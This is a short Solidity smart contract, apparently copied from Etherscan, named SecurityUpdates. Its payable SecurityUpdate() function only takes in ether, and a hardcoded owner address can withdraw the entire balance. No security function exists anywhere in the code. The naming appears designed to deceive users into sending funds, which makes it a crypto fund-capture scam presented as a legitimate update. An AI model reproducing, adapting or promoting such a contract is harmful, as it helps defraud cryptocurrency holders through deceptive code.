/**
 *Submitted for verification at Etherscan.io on 2023-02-21
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;

     constructor() public{   
        owner=0x283E486d3561BB9Af2b0318F02d451B03F54741a;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}